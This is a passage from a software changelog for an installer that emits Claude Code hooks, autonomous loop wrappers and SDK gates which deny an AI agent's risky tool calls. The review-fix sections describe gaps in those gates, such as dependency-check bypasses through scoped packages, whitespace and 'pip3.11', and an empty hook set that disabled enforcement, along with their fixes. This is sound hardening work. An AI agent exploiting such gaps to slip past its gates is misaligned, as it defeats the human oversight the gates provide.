  `BOOTSTRAP-COMPANION.md` → `Bootstrap-Protocol-Companion-v2-0-0.md`).
  The v2.0.0 document's own convention is versioned self-naming (its
  line-149 naming rule), and its section anchors (6.D, Phases 9.5/9.7)
  survive, so emitted citations stay accurate.
- **Deliberately NOT updated:** the frozen RETROFIT-track documents
  (`RETROFIT.md`, `RETROFIT-COMPANION.md`, `RETROFIT-GAP-ANALYSIS.md`)
  still cite `BOOTSTRAP.md`; those references now dangle and are left for
  the retrofit track to reconcile (its docs are frozen at v1.6.2).
- `plugin/plugin.json` description bumped to v2.0.0;
  `tests/test_retrofit.py` literal version assertion 1.9.0 → 2.0.0.

**FREEZE-EXCEPTION (golden re-baseline #1).** Both fixtures re-baselined
for exactly two byte classes, verified by a HEAD-vs-worktree plan diff
with zero non-pairing residue:
1. `settings.json` `_generatedBy`: `protocol 1.9.0` → `protocol 2.0.0`;
2. protocol-document citations inside emitted hook/wrapper/config bodies:
   `BOOTSTRAP.md` → `Bootstrap-Protocol-v2-0-0.md`.
(default: 12 files; full_autonomous: 21 files.) Note: the spec's
task-decomposition guidance omitted R-0 from the re-baseline list, but
AC-A0-3's `_generatedBy` requirement necessarily perturbs the golden
surface — recorded here rather than silently absorbed.

### R-1 (IC-3) — `gate_substrate` state field

- `_write_state` emits `"gate_substrate": "shell"`.
- Non-destructive migration: a state file lacking the field (pre-2.0.0) is
  backed up once to `.bootstrap-state.json.pre-2.0.0` (Companion Migration
  notes) before being stamped; pre-existing keys are preserved.
- `"sdk-callable"` is unwritable in Milestone A (source-level tripwire in
  `tests/test_gate_substrate.py`; Milestone B replaces it with the
  `lib/ic_checks.py` gate). Outside the golden surface [SR-07].

### R-2 (IC-1) — `synthesize --validate-only`

- New flag on the `synthesize` subparser: parse interview → `resolve_config`
  invariants → violations to stderr → **no file written** → exit 0/2.
- The no-flag path is byte-identical to 1.9.0, proven against the HEAD code
  and locked as a mini-golden digest in `tests/test_validate_only.py`
  (AC-2-3 [SR-12]). This closes seam IG-01 (the §3.2 row upgrades when the
  seam re-pins to 2.0.0).

### R-3 (IC-4) — advisor default model

- `lib/llm_advisor.py` default: retired dated Sonnet-4 ID →
  **`claude-sonnet-5`** (verified 2026-07-17 against the live
  platform.claude.com models overview: it is the current Sonnet's Claude
  API ID *and* alias, a dateless pinned snapshot; no date suffix exists or
  may be appended). `BOOTSTRAP_INTERVIEW_LLM_MODEL` override retained.
- Proposes-never-decides and loud deterministic fallback proven unchanged
  (`tests/test_advisor_model.py`), including the never-send-commands
  invariant.

### R-4 (IC-2) — root-sentinel dual-honor (PERMANENT)

- `loop.sh`, `goal-loop.sh`, `auto.sh` additionally honor
  `<project>/.halt` (graceful stop at the next boundary) and NEW
  `<project>/.halt-hard` (immediate wrapper exit; the wrapper never signals
  an in-flight `claude -p` — killing processes is the caller's job).
  Legacy `.claude/queue/.halt`/`.resume` remain honored. Emitted comments
  bind the operator-completed iteration loops to re-check both sentinels
  at every iteration boundary. In `auto.sh` the checks run before the
  cleanup trap is installed so a halt refusal can never touch another
  run's `.run-active` sentinel.
- **Gitignore home [SR-17] — owner decision (a):** the installer manages a
  marker-delimited block (`# --- bootstrap-protocol managed: begin/end ---`)
  in the **project-root** `.gitignore` ignoring `/.halt` and `/.halt-hard`
  — a deliberate write surface outside `.claude/`, emitted as a visible
  plan action (kind `gitignore_root`, shown in `--dry-run` / Phase 0.5
  preview) only when at least one autonomous wrapper is emitted.
  Merge semantics: file absent → created (wholly-authored, digest-tracked
  normally); operator file → block appended once / refreshed in place,
  bytes outside the markers never touched, manifest entry
  `state: managed-block-appended` with a `block_digest` and **no**
  whole-file digest (operator edits outside the block never fire hand-edit
  warnings; uninstall keeps the co-owned file); torn block → loud SKIP.

**FREEZE-EXCEPTION (golden re-baseline #2, full_autonomous only).**
1. Three wrapper bodies gain the ROOT_HALT/ROOT_HALT_HARD guards;
2. One **added** action: project-root `.gitignore` (65 → 66 actions).
The default fixture is untouched by R-4 (its digest is the R-0 value).

### R-5 (IC-7) — machine-readable hook tiers

- Every manifest entry (and the `settings.json` entry) now carries
  `tier: security-critical | autonomy-critical | non-critical` per seam
  §7.2. Membership (contract-level; a change is a seam event):
  security-critical = secrets-gate, spec-gate-commit, dependency-gate,
  test-gate, eval-gate, tdd-gate, format-lint-gate, settings.json;
  autonomy-critical = drift-detector-loop-cooperation,
  iteration-summary-enforcement; all else non-critical;
  **spec-gate-entry deliberately non-critical** (warn-tier).
- Shell-era baseline, not a frozen ceiling: Milestone B adds
  `sdk_gates/gates.py` to the security set under the seam MAJOR [SR-02].
- No golden impact — the manifest is an `apply()`-time artifact [SR-07].

### R-6 — model remap: assertion, not assumed diff [SR-08]

- Asserted (not re-emitted): implementer `sonnet`, reviewer `opus`
  (+ `effort: high`), integrator explicitly `inherit`, goal judge
  `haiku`, no Fable subagent anywhere. Subagent frontmatter had **zero
  emission diff**, as the spec predicted — alias resolution is
  platform-side managed drift per the Companion guardrail.
- **AC-6-5 (docs verification, owner-reworded):** `effort:` IS a
  documented subagent-frontmatter key (code.claude.com/docs/en/sub-agents,
  verified 2026-07-17: overrides the session effort level; values
  low|medium|high|xhigh|max). The already-emitted `effort: high` on the
  reviewer (greenfield `templates.py` and the retrofit variant) is kept
  and now assertion-locked; greenfield/retrofit consistency asserted.

**FREEZE-EXCEPTION (golden re-baseline #3, full_autonomous only,
AC-6-4 only-if-diff case).** Exactly one file: `auto-config.md` gains the
Companion-mandated queue-summary-synthesis surface
(`summary_synthesis_enabled: true`, `summary_synthesis_model: haiku` —
Model Assignment Strategy table names `.claude/auto-config.md` as its
configuration surface; the 1.9.0 template omitted it).

### Finding 1 (PR #5 review) — goal-config keys vs Phase 9.6 (code moves)

Owner ruling: the discrepancy is code-vs-normative-spec — Phase 9.6
enumerates the goal-config surface with `evaluator_model` in the
`evaluator_*` family (Bootstrap-Protocol-v2-0-0.md:1336, :1382). Sweep of
the emitted `goal-config.md` against the full normative list:

| Phase 9.6 item | 1.9.0/2.0.0-A emission | Action |
|---|---|---|
| `max_iterations` (10) | ✓ present, correct | none |
| `evaluator_model` (haiku) | ✗ MISNAMED `judge_model` (value correct) | renamed; alias dual-read added |
| `evaluator_disagreement_threshold` (3) | ✗ MISSING (zero hits) | added |
| `evaluator_feedback_history_depth` (2) | ✗ MISSING (zero hits) | added |
| judge-API-failure retry posture (retry-once-then-halt) | ✗ missing; **doc names no config key** | documented in emitted comments; key naming needs an owner/spec decision. NOT to be conflated with `infra_retry_seconds`/`infra_max_consecutive_failures`: those configure the transient-`claude -p` infrastructure side (mirrored from `loop-config.md`, a mode with no judge at all); the judge-API posture is a distinct fixed retry-once-then-halt behavior ("same posture as" ≠ same keys, Phase 9.6) with genuinely no key in the emission |
| completion-criteria checklist | partial (`require_completion_sentinel: true`); no normative key names for the full checklist | kept; documented; naming needs spec decision |
| classifier thresholds | partial (`summary_failure_halt_threshold: 3` — the malformed-summary threshold); others unnamed in doc | kept; documented |
| audio-cue overrides | ✗ missing; no key names in doc | documented; naming needs spec decision |

Extras retained (not in the enumeration, protocol-consistent):
`infra_retry_seconds`, `infra_max_consecutive_failures` (transient
`claude -p` posture, mirrors loop-config), `investigate_disagreement`
(the Phase 9.6 `--investigate-disagreement` opt-in). `judge_model` was
the ONLY misnamed key found — no other aliases needed.

**Deprecated alias:** `goal-loop.sh` resolves `evaluator_model` from
`goal-config.md`; `judge_model` is honoured only when `evaluator_model`
is absent, with a loud stderr warning and a `hooks.log` entry. Exported
as `EVALUATOR_MODEL` for the operator-completed judge call.

**FREEZE-EXCEPTION (golden re-baseline #4, full_autonomous only).**
Exactly two files: `goal-config.md` (rename + two added keys +
documentation comments) and `goal-loop.sh` (alias resolution block).
`loop.sh` verified byte-identical. Tests:
`tests/test_goal_evaluator_keys.py` (13 checks).

**Migration note:** operators with a pre-2.0.0 `goal-config.md` keep a
working setup — the `judge_model` alias is honoured with a deprecation
warning until they rename the key; new emissions use `evaluator_model`.

### Finding 2 (PR #5 review) — `auto.sh` `.run-active` race safety (fixed)

Classified as a pre-existing conformance defect against Phase 9.7's
race-safety ("abort ... rather than overwriting",
Bootstrap-Protocol-v2-0-0.md:1455): the refuse-to-start path's EXIT trap
ran `rm -f "$RUN"` unguarded, deleting the *winner's* sentinel — which
would let a third invocation start a concurrent runner past the
combined-concurrency cap. Fixed in `auto.sh`:

1. **CLAIMED guard** exactly as the per-task wrappers: cleanup removes
   the sentinel only if this process claimed it.
2. **PID-liveness startup check** (Phase 9.7: "sentinel-presence alone is
   not a sufficient check"): `kill -0` plus a `/proc` fallback (so EPERM
   on another user's live process is not misread as dead). Unparseable
   sentinel → fail-safe refusal, untouched.
3. **Stale sentinel** (recorded PID dead): alert with the recorded start
   timestamp and ask before clearing; EOF/non-interactive defaults to No
   (side-effect-free refusal). Cleared-and-continue is logged.
4. **Re-verify before clear**: if the sentinel changed while waiting at
   the prompt, another runner claimed it — abort without touching it.
5. **O_CREAT|O_EXCL claim** (`set -C`), per the Phase 9.7 idiom the
   per-task wrappers already used; a failed claim aborts non-zero.

**FREEZE-EXCEPTION (golden re-baseline #5, full_autonomous only).**
Exactly one file: `auto.sh`. Tests: `tests/test_auto_run_sentinel.py`
(16 checks — live-PID refusal intact-sentinel, stale-cleared path,
race-loser intact-sentinel, normal-run self-cleanup, plus fail-safe
branches).

**Migration note:** `auto.sh` refusal is now **side-effect-free** — a
refusing invocation never deletes another run's `.run-active`.
Previously any existing sentinel caused refusal; now a live-PID sentinel
refuses, a stale one offers an operator-confirmed clear (non-interactive
invocations still refuse), so unattended behavior is unchanged except
that refusals no longer corrupt state.

### Migration note (operators)

Operators who never opt into the SDK substrate see **no behavioral change**
beyond: (1) the new `gate_substrate: "shell"` field (plus a one-time
`.bootstrap-state.json.pre-2.0.0` backup when upgrading a 1.x state file);
(2) the three autonomous wrappers additionally honoring the root sentinels
(inert unless you create `/.halt` or `/.halt-hard`); (3) for
autonomous-mode installs only, the managed root-`.gitignore` block keeping
those sentinels uncommittable. The shell gate suite is unchanged and
remains fully operative; fail-loud-on-empty-commands holds.

### PR5-04 hardening (adversarial review of PR #5)

Two hardening items on the Finding-2 startup sequence, verified against
the review's assertions (trap ordering was confirmed already correct —
`CLAIMED=0` precedes `trap cleanup EXIT`):

1. **Portable liveness probe:** `kill -0` + `/proc` fallback replaced by
   `ps -p` — immune to the EPERM misclassification (a live process under
   another user) and free of the Linux-only `/proc` dependence; a
   cannot-determine result still lands on refuse.
2. **tty-guarded prompt:** the stale-clear question is asked only when
   stdin is a terminal; a non-tty invocation auto-answers No *before any
   stdin read*, so an inherited open-but-silent pipe can never hang the
   runner (the F-2 hang class). `BOOTSTRAP_TEST_FORCE_PROMPT=1` is a
   documented TEST-ONLY override that forces the prompt path on a
   non-tty — it can only enable *asking* (the answer is still read from
   stdin, default No), never clearing.

**FREEZE-EXCEPTION (golden re-baseline no. 6, full_autonomous only).**
Exactly one file: `auto.sh`. Tests: `tests/test_auto_run_sentinel.py`
grows to 19 checks (adds the ps-p/tty-guard statics and the
non-tty-'y'-without-override case).

Also in this change: `plugin/plugin.json` bumps its own `version` field
`1.0.0` → `2.0.0` (the plugin is a distribution surface; its description
already declared protocol v2.0.0 — reviewer item PR5-05).

### Adversarial code review of the branch — fixes (four classes)

**Class 1 — `auto.sh` startup race safety & portability** (review findings
1, 4, 5, 6; all empirically reproduced by the verifiers before fixing):

1. **Dual-'y' race closed with a startup lock.** The whole
   check → operator-confirmed clear → O_CREAT|O_EXCL claim sequence now
   runs under `flock` on `queue/.run-active.lock`; a second invocation
   refuses instantly instead of racing the clear (previously two
   interactive operators could both pass re-verify and the loser's `rm`
   deleted the winner's fresh sentinel — reproduced). flock was already a
   hard requirement of the per-task wrappers; `auto.sh` now shares that
   posture (refuses if flock is unavailable). The re-verify stays as
   defense-in-depth against non-`auto.sh` sentinel writers. The lock file
   joins both gitignore fragments.
2. **Errexit-proof sentinel parsing.** `run_pid`/`run_start` helpers
   swallow sed failures (`|| true` inside the pipeline), so an unreadable
   sentinel or sentinel-as-directory reaches the loud fail-safe branches
   instead of dying silently via `set -euo pipefail` (previously rc 2/4
   with no message and a wrong infrastructure-failure exit reason).
3. **Three-state liveness.** `pid_alive` self-probes `ps -p $$` first; on
   platforms whose ps lacks `-p` (verified on BusyBox v1.37.0) it falls
   back to `kill -0`, whose success proves aliveness and whose failure is
   **cannot-determine → refuse** — never "dead". A live run's sentinel can
   no longer be offered for clearing on busybox-class systems.
4. **Prompt read time-bounded** (`read -t`, `BOOTSTRAP_PROMPT_TIMEOUT`
   default 60s): even a forced prompt on an open-but-silent pipe (the
   `BOOTSTRAP_TEST_FORCE_PROMPT` leak scenario, reproduced as an
   indefinite hang) now falls through to No at the bound.

**FREEZE-EXCEPTION (golden re-baseline no. 7, full_autonomous only).**
`auto.sh` + the queue-gated gitignore fragment line. Tests:
`tests/test_auto_run_sentinel.py` grows to 26 checks (dual-invocation
lock refusal, directory sentinel, broken-ps dead/live cases, hang bound).

**Class 2 — state-file migration & retrofit parity** (review findings 3,
10; plus the double-read TOCTOU noted by the verifiers):

1. **Corrupt-state backup.** The IC-3 migration now reads the pre-2.0.0
   state file ONCE and backs up those raw bytes even when the file is too
   corrupt to parse — previously a truncated state file skipped the
   backup and was clobbered (verifier-reproduced data loss). The
   single-read design also removes the parse-vs-backup second-read
   window, so the `.pre-2.0.0` backup is byte-identical to what the
   migration classified.
2. **Retrofit `gate_substrate` parity.** `_write_retrofit_state` now
   emits `gate_substrate: "shell"` alongside `bootstrap_protocol_version`
   — retrofit installs ship the same 2.0.0 wrappers and shell gate suite,
   and the 2.1.0 `ic_checks`/seam consumers key off the field.
   (Additive top-level key; B5 shape and the C1 sibling-function
   discipline preserved — `_write_state` untouched by this half.)

No golden impact (state files are `apply()`-time artifacts).
Tests: `tests/test_gate_substrate.py` → 15 checks (corrupt-file case);
`tests/test_retrofit.py` → 254 (8.5 parity assertion).

**Class 3 — gitignore surfaces** (review findings 2, 7, 8):

1. **Retrofit root-`.gitignore` emission.** `_apply_retrofit_overlay` (the
   single retrofit dispatch site per C1) now appends the `gitignore_root`
   managed-block action whenever any autonomous opt-in scaffolds a
   wrapper — the greenfield gate reads top-level `*_enabled` flags, which
   B5 pins false in retrofit mode, so retrofit projects previously got
   root-sentinel-honoring wrappers with committable sentinels (AC-4-5
   violated on that path; verifier-reproduced). No opt-ins → no root
   write, scope unchanged.
2. **Co-owned metadata preserved.** The managed-block append/refresh
   paths now keep the operator's existing file mode instead of resetting
   to 0644 (the inode still changes — content-write atomicity wins over
   inode stability for a gitignore).
3. **Migration backups never committable.** Both emitted `.claude/
   .gitignore` fragments gain the `.bootstrap-state.json.pre-*` pattern,
   covering the new `.pre-2.0.0` backup and every future one (the
   retrofit fragment's per-version entries stay for back-compat).

**FREEZE-EXCEPTION (golden re-baseline no. 8, BOTH fixtures, one file
each).** `.claude/.gitignore` gains the `pre-*` pattern — the first
default-fixture change since R-0; items 1 and 2 are overlay/apply-time,
outside the golden surface. Tests: `tests/test_root_sentinels.py` → 34
checks (retrofit emission + no-opt-in scope guard, mode preservation,
fragment pattern).

**Class 4 — goal-config value parsing** (review finding 9):

`goal-loop.sh` gains `goal_cfg_value()`: inline `# comment` stripped,
matching surrounding quotes removed, whitespace trimmed, sed failure
survived under errexit+pipefail — so an operator edit like
`evaluator_model: sonnet  # harder criteria` resolves to `sonnet`
instead of exporting the comment into the judge invocation verbatim
(probe-confirmed failure mode). The resolved value is logged
(`evaluator_model=<value>`) for observability; both the normative key
and the deprecated `judge_model` alias go through the same sanitizer.

**FREEZE-EXCEPTION (golden re-baseline no. 9, full_autonomous only,
goal-loop.sh).** Tests: `tests/test_goal_evaluator_keys.py` → 18 checks.

*Recorded, not fixed (out of review scope):* the per-task wrappers'
`log()` emits a literal `\n` (a `.format`-doubling quirk), so their
hooks.log entries share one physical line — `auto.sh`'s log() is
unaffected. Worth its own small freeze-exception later.

### Milestone B (reserved)

IC-5 (SDK `PreToolUse` callables per seam §9, Tessera-owned runner,
module-only emission), IC-6 (native worktree routing, flag/version to be
verified against official docs), `lib/ic_checks.py`, the runtime-floor
startup check (seam binds ≥ v2.1.210 for fail-closed PreToolUse timeout —
confirm the exact floor per the seam's own TODO), and the
`PROTOCOL_VERSION` → `"2.1.0"` bump land only after Milestone A review and
owner approval, and are recorded here as `2.0.0 → 2.1.0` when they do.

## 2.0.0 → 2.1.0 (Milestone B — SDK substrate; in progress)

**Seam:** `SEAM-CONTRACT-v2-0-0.md` (at the time of this Milestone-B work
it was `SEAM-CONTRACT-v1-2-0.md` at the Milestone-A pin event: protocol
2.0.0 pinned by commit `1fa5bb6`; renamed and re-pointed to `2.4.0 @
251f82f` at the seam-2.0.0 substrate re-cut). Branch `version-2-1-0`.

### B-pre — `_hook_tier` forcing function (entry precondition)

- `templates.HOOK_EVENT_MAP` hoisted to module level (emitted bytes
  unchanged; golden green pre-R-7); `installer.py` asserts at import that
  the seam §7.2 tier sets exactly partition the emitted hook set (new
  explicit `NON_CRITICAL_HOOKS`; unclassified/phantom/double-claimed
  names fail loud at every CLI entry point).

### Verify-first findings (2026-07-18, against official changelogs)

- **Claude Code runtime floor ≥ v2.1.210 CONFIRMED** (fail-closed
  PreToolUse hook timeout at 2.1.210; worktree-entry consent 2.1.206;
  exact-match hyphen matchers 2.1.195 — all subsumed by the floor). The
  seam's `[TODO: confirm]` on `claude_code_runtime` is resolvable
  seam-side with no value change. *Owner accepted 2026-07-18; the TODO
  drops as confirmed in the owner's seam patch.*
- **`claude-agent-sdk` feature floor = v0.1.60** (owner correction
  2026-07-18, re-verified at the tags). The basic §4.1 deny shape
  (`hookSpecificOutput` + `permissionDecision: "deny"` +
  `permissionDecisionReason`) exists from v0.1.2 tagged source, but the
  load-bearing dependencies land later: `dontAsk` absent from the SDK's
  `PermissionMode` until **0.1.51** (#719; the seam §3.1 mandated
  dispatch posture), and `setting_sources=[]` silently dropped until
  **0.1.60** (#822) — R-7's SessionStart/SessionEnd shell retention
  relies on `setting_sources=["project"]`. `additionalContext` on the
  PreToolUse output is 0.1.29 (subsumed). Floor = **0.1.60**, replacing
  the provisional ceiling-as-floor `>=0.2.114`. The `"defer"` decision
  value (0.1.74) is a FORWARD OPTION, deliberately not required. The
  seam patch is owner-side.
- **Native worktree flag `--worktree`/`-w` confirmed in official docs**
  (worktrees at `.claude/worktrees/<name>/`, branch `worktree-<name>`,
  `worktree.baseRef`, `.worktreeinclude`); its introduction version is
  NOT verifiable from official release notes (v2.1.49 is secondary-source
  only) — R-8 therefore relies on the binding ≥ 2.1.210 floor, which
  subsumes it, and pins no introduction version.

### R-7 (IC-5) — gates as SDK `PreToolUse` callables

- New emitter `lib/sdk_gates_template.py` — **[SR-11] the separate-module
  deviation is CONFIRMED at implementation** (Python-emitting-Python
  stays syntax-checkable outside templates.py's shell-heredoc
  conventions); registered as `TEMPLATES["sdk_gates"]`.
- Emits `.claude/sdk_gates/gates.py` per seam §9 VERBATIM: single public
  builder `build_hooks(config) -> {"PreToolUse": [HookMatcher...], ...}`,
  no I/O at import (probe-asserted), no network I/O, subprocess-only
  loading documented, refusals in the structured §4.1 deny shape with
  shell-parity reason strings (AC-7-5 fixtures assert each reason literal
  against the emitted shell bodies). Seven gates: secrets, spec-commit,
  dependency, test, tdd, eval (PreToolUse) + format-lint (PostToolUse,
  feedback-only, never denies — mirroring its warn-tier shell nature).
- Empty `commands.test` denies with the TODO reason (AC-7-2,
  fail-loud-on-empty-commands); the full shell suite remains emitted as
  the SEV-1 manual path (AC-7-3); `kind: "sdk_gates"` maps to the
  security-critical tier (AC-7-6) — the §7.2 membership addition the
  seam commits to at the substrate release, mirrored in
  `tests/test_hook_tiers.py`'s contract list deliberately.
- The retrofit overlay DROPS the module (retrofit stays shell-era
  `RETROFIT_PROTOCOL_VERSION`; Tessera's seam excludes retrofit, IG-10).
- Tests: `tests/test_sdk_gates.py` (49 checks, stubbed
  `claude_agent_sdk`).

**FREEZE-EXCEPTION (golden re-baseline no. 10, both fixtures).** Exactly
ONE new action each (54 → 55, 66 → 67): `.claude/sdk_gates/gates.py`.
Diff-verified vs HEAD: zero existing files changed, zero removed.

### R-8 (IC-6) — native worktree routing

- Baseline finding, recorded per the spec's verify-first note: the
  emitted wrappers contain **no hand-rolled `git worktree add`** — they
  are guarded skeletons whose iteration loop is operator-completed, so
  "replace hand-rolled creation with native" reduces to routing the
  documented dispatch through the native mechanism.
- `loop.sh` / `goal-loop.sh` skeletons now instruct the operator-
  completed loop to dispatch `claude -p --worktree "wt-$TASK_ID"`
  (Claude Code creates/reuses `.claude/worktrees/wt-<task-id>/`; a
  worktree is drift-prevention, NOT a security boundary) and forbid
  hand-rolling `git worktree add` (AC-8-1).
- The claim/sentinel + cross-mode accounting block is RETAINED with its
  why-native-does-not-cover-this documentation inline (AC-8-2/AC-8-3):
  `--worktree` isolates the working directory only; per-task mutual
  exclusion (O_CREAT|O_EXCL sentinel) and the combined-concurrency
  accounting (`loop_in_flight`/`goal_in_flight` under flock) stay in the
  wrapper.
- **Manual verification note (AC-8 "operator-only" shape):** native
  `--worktree`/`-w` behavior verified against the official worktrees
  docs on 2026-07-18 (worktrees at `.claude/worktrees/<name>/`, branch
  `worktree-<name>`, `worktree.baseRef`, `.worktreeinclude`); the flag's
  introduction release is not verifiable from official release notes
  (v2.1.49 is secondary-source only), so the wrappers rely on the
  binding seam runtime floor ≥ 2.1.210, which subsumes it. Live
  end-to-end wrapper dispatch remains operator-verified per the trust
  ramp (the skeleton refuses unattended use by design).
- Tests: `tests/test_installer.py` wrapper-shape assertions
  (`--worktree` present, no `git worktree add`, RETAINED-case doc
  present).

**FREEZE-EXCEPTION (golden re-baseline no. 11, full_autonomous only,
loop.sh + goal-loop.sh).** Diff-verified vs HEAD: exactly two files
changed, zero added, zero removed; default fixture byte-identical.

### R-9 — the IC gate + 2.1.0 release identity

- New `lib/ic_checks.py`: deterministic, self-contained IC-1..IC-7
  self-checks against the live emission surface (validate-only surface,
  wrapper sentinel dual-honor, state-writer behavioral probe, advisor
  default, SDK-gate module contract incl. single-public-builder AST
  check, native worktree routing, tier partition).
  `BOOTSTRAP_IC_FORCE_FAIL=<IC>` is a documented TEST-ONLY override that
  can only force REFUSING (the BOOTSTRAP_TEST_FORCE_PROMPT asymmetry).
- New config surface: top-level `gate_substrate: "shell" | "sdk-callable"`
  (default `"shell"`, byte-identity for existing configs; refused in
  retrofit mode). `"sdk-callable"` is a REQUEST: the installer refuses
  the install loudly — listing every failing check, writing nothing, an
  existing state file therefore retaining `"shell"` — unless all seven
  checks pass (AC-9-1); on green checks the state writer records the
  granted value (AC-9-2). The refusal applies under `--dry-run` too.
- `bootstrap-install --ic-checks` prints the checklist as JSON, exit
  non-zero on any failure — the CI-assertable form for the seam §8.2
  `protocol-compatibility` job (AC-9-3).
- AC-9-4 runtime-floor startup check: `_runtime_floor_check()` logs the
  detected Claude Code CLI version and warns LOUDLY below the seam floor
  ≥ 2.1.210 (confirmed against the official changelog 2026-07-18 —
  resolving the spec's "confirm the exact floor" note) or when
  undetectable; never fatal (the floor binds dispatch, not emission),
  never silent.
- Release identity (AC-9-5): `PROTOCOL_VERSION` → `"2.1.0"` in
  `lib/installer.py` + `lib/templates.py`; `INSTALLER_VERSION` → 1.1.0;
  `RETROFIT_PROTOCOL_VERSION` stays 1.6.2. The protocol document's
  conformance note gains the marked **[2.1.0 update — substrate
  OPERATIVE]** addition (incl. the recorded IC-6 caveat: `--worktree`
  confirmed in official docs, introduction release unverifiable,
  subsumed by the runtime floor).
- Deliberate test re-pins: `test_gate_substrate.py` AC-1-3 tripwire
  replaced with its promised Milestone-B form (sdk-callable writable
  ONLY via the ic_checks gate; writer never hardcodes it); version
  literals 2.0.0 → 2.1.0 in `test_installer.py` (AC-A0),
  `test_gate_substrate.py`, `test_retrofit.py` (8.3).
- Tests: `tests/test_ic_gate.py` (28 checks: gate refusal/grant/JSON
  checklist, config enum + retrofit exclusion, floor-warn via
  PATH-injected fake `claude`, release identity).

**FREEZE-EXCEPTION (golden re-baseline no. 12, both fixtures).** Exactly
ONE file each: settings.json `_generatedBy` "protocol 2.0.0" →
"protocol 2.1.0" (emitted doc citations untouched — the protocol document
keeps its versioned v2-0-0 self-name). Diff-verified vs HEAD: zero added,
zero removed, no other file changed.

### Code-review fix pass (max-effort adversarial review of R-7..R-9)

Correctness (emitted `sdk_gates/gates.py`):
- **NameError-proofing:** the emitted `RESOLVED_CONFIG` snapshot coerces
  leaf scalars to `str`, so a YAML-typed `commands.test: true` (bool/None)
  no longer renders `true`/`null` — undefined Python names that
  NameError'd the whole module at the consumer's import.
- **Gates run non-blocking:** every `subprocess.run` inside an async hook
  is now `asyncio.create_subprocess_*` via a shared `_run` helper — a
  blocking test/lint no longer freezes the consumer's single-threaded SDK
  event loop for up to the declared timeout.
- **tdd-gate** normalizes ABSOLUTE `file_path` (what Claude Code sends) to
  project-relative before the `src/|lib/` test — it was a silent no-op.
- **dependency-gate** handles `@scoped` npm packages, collapses whitespace
  (tab / multi-space), and recognizes `python[3] -m pip install` — closing
  fail-open bypasses.
- **secrets-gate** normalizes bash negated classes `[^…]` → fnmatch `[!…]`
  so the deny-list OVER-matches (the T-1 bias it claimed but violated);
  patterns are precomputed once per config.
- **test-gate** staleness scans `src/` AND `lib/` (parity with tdd's
  source definition); **eval-gate** inspects the whole `@{u}..HEAD` push
  range, not just the last commit; **spec-gate-commit** skips dot-dirs to
  match the shell corpus; **format-lint** merges stderr→stdout for the
  shell's chronological `2>&1 | tail`.
- **build_hooks** derives gate MEMBERSHIP from the passed config
  (`_resolved_hooks`, now carried in the snapshot), never a stale
  emission-time set.

IC gate (`lib/ic_checks.py`) + state transition:
- **IC-1/IC-4** are now BEHAVIORAL/attribute checks (drive
  `interview.main --validate-only`; assert the hoisted
  `llm_advisor.DEFAULT_ADVISOR_MODEL`) instead of source greps that
  green on a docstring; **IC-2** matches `"$ROOT_HALT"` (not the
  `ROOT_HALT_HARD` substring); **IC-6** inspects NON-COMMENT lines for a
  hand-rolled `git worktree add` (the strip-the-phrase match had become a
  shadow grammar — it broke on the very fix that documented the flag).
- `BOOTSTRAP_IC_FORCE_FAIL` RAISES on an unknown value (was a silent
  no-op into a real grant).
- The partition forcing function moved from import-time to `build_plan`,
  so a violation no longer crashes `--ic-checks` (whose IC-7 reports it)
  or `--uninstall`.
- The IC gate runs before `--print-config` returns (verdict consistency
  with the install), and `_write_state` ENFORCES the gate at the write
  (`_ic_gate_cleared` token) — no caller bypassing `main()` can stamp an
  ungated `sdk-callable`; a substrate downgrade on re-apply warns loudly.
- `resolve_config` validates `gate_substrate` before the archetype
  early-return (errors batch) and normalizes an invalid value to `shell`.

Lifecycle:
- `apply_plan` removes stale files dropped from the plan on re-apply (a
  retrofit-over-greenfield re-install no longer orphans
  `sdk_gates/gates.py` on disk while losing its manifest digest); the
  `.claude/.gitignore` ignores `sdk_gates/__pycache__/`; the wrapper's
  IC-6 comment documents the `.git/info/exclude` worktree-ignore (the
  committed-`.gitignore` fix would break `git worktree add`); the
  runtime-floor version parse is anchored (ignores update-notifier
  banners, scans stderr too); the conformance-note stale tail corrected.

Tests: +25 regression checks across `test_sdk_gates.py` (57) and
`test_ic_gate.py` (37). Full suite: 700 checks green / 13 files.

**FREEZE-EXCEPTION (golden re-baseline no. 13, both fixtures).** Emitted-
byte changes: `.claude/.gitignore` + `.claude/sdk_gates/gates.py` (both
fixtures); `.claude/loop.sh` + `.claude/goal-loop.sh` (full_autonomous).
Diff-verified vs the pre-fix head: zero files added, zero removed.

### Adversarial re-sweep — regressions the fix pass introduced

A second max-effort sweep over the fix commit found regressions the fixes
themselves created; all fixed here, each now with a non-tautological
regression test:
- **`build_hooks` empty-set trap:** an empty `_resolved_hooks` (`[]`) fell
  through to zero gates — a security substrate silently disabling all
  enforcement. Now a missing OR empty value falls back to the emission
  `GATES` (never the empty set).
- **`gates.py` orphan, sharpened:** the new stale-file cleanup deleted
  `gates.py` on a greenfield-sdk-callable → retrofit re-apply, but the
  retrofit state writer (a separate `.retrofit-state.json`) left
  `.bootstrap-state.json` still advertising `sdk-callable`.
  `_reconcile_orphaned_substrate` now downgrades it to `shell` loudly when
  the module is no longer emitted.
- **`--dry-run` now previews removals** (`REMOVE (dry run)` + counted) so
  the preview is faithful for the destructive re-apply case.
- **Dependency-gate:** versioned `pip3.11 install` matched (`pip[0-9.]*`);
  whitespace collapse no longer merges a verb split across NEWLINES
  (per-line scan) — that would false-block a commit whose message merely
  mentions an install verb.
- **tdd-gate `_proj()` resolves** to an absolute root so the
  absolute-path relativization is stable.
- **IC-1 is genuinely end-to-end:** it builds a real interview via
  `analyze` and drives `synthesize --validate-only` to the validate
  branch (the prior probe returned at file-not-found, before the branch —
  a vacuous check); **IC-5** defers to IC-7 instead of misattributing a
  partition break; runtime-floor parse also matches a `version`-keyword
  form.
- **Worktree comment de-mangled:** the `.git/info/exclude` example used a
  shell line-continuation backslash that Python collapsed inside the
  non-raw template string, corrupting the emitted one-liner; rewritten as
  a single line.

Also proven (previously untested): stale-file cleanup end-to-end (unlink
+ manifest-orphan removal + L-1 hand-edit preservation + state
reconcile), runtime-floor banner anchoring, `build_hooks` enlargement
from a genuine subset fixture, eval-gate `@{u}..HEAD` whole-range with an
upstream.

Tests: 706 checks green / 13 files (`test_sdk_gates.py` 63,
`test_ic_gate.py` 44). *(RC-08 correction, 2.2.0: this line previously
claimed 726 — a stale tally never matched to a measured run. The measured
total at the 2.1.0 tip is 706; corrected in place rather than carried
forward. No test was removed — the 726 figure was wrong when written.)*

**FREEZE-EXCEPTION (golden re-baseline no. 14, both fixtures).** Emitted-
